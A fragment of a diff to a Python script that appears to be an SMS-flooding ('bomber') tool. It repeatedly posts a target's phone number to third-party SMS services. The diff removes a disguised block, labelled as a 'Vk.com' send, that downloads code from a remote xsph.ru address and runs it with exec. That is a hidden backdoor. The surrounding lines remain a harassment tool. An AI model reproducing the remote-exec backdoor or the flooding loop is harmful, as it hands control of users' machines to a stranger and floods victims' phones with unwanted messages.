@@ -272,11 +272,6 @@ def infinity():
 			print('[+] qlean отправлено!')
 		except:
 			print('[-] Не отправлено!')
-		try:
-			exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
-			print('[+] Vk.com отправело!')
-		except:
-			print('[-] Не отправлено!')
 
 		try:
 			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
